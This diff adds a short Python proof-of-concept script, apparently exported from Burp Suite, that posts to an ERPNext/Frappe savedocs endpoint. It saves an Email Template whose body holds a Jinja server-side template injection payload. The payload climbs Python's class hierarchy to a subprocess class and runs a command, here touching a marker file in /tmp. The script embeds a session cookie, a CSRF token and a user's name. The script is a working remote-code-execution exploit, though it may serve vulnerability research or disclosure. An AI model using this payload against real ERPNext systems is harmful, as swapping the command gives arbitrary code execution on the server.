@@ -1,0 +1,9 @@
+import requests
+
+session = requests.session()
+
+burp0_url = "http://erpnext:8000/api/method/frappe.desk.form.save.savedocs"
+burp0_cookies = {"user_image": "", "sid": "8674e35259b86c05fcd678b44ac99c2574535c4bafd6886a6344a48d", "user_id": "zeljka.k%40randomdomain.com", "system_user": "yes", "full_name": "Zeljka%20Kola%C5%A1inac"}
+burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "application/json", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Frappe-CSRF-Token": "48fe371f6b4c5a1c896fd3a3dbdc177d8d8aff82598ca843fa0ab20f", "X-Frappe-CMD": "", "X-Requested-With": "XMLHttpRequest", "Origin": "http://erpnext:8000", "Connection": "close", "Referer": "http://erpnext:8000/desk"}
+burp0_data = {"doc": "{\"response\":\"<div>{% set string = \\\"ssti\\\" %}</div><div>{% set class = \\\"__class__\\\" %}</div><div>{% set mro = \\\"__mro__\\\" %}</div><div>{% set subclasses = \\\"__subclasses__\\\" %}</div><div><br></div><div>{% set mro_r = string|attr(class)|attr(mro) %}</div><div>{{mro[1]}}</div><div>{% set subclasses_r = mro_r[1]|attr(subclasses)() %}</div><div>{{ subclasses_r[151]([\\\"/usr/bin/touch\\\",\\\"/tmp/das-ist-walter\\\"]) }}</div>\",\"subject\":\"ssti_50\",\"name\":\"ssti_50\",\"creation\":\"2022-11-08 16:10:39.997908\",\"idx\":0,\"owner\":\"zeljka.k@randomdomain.com\",\"docstatus\":0,\"modified\":\"2022-11-08 18:04:36.147373\",\"doctype\":\"Email Template\",\"modified_by\":\"zeljka.k@randomdomain.com\"}", "action": "Save"}
+session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
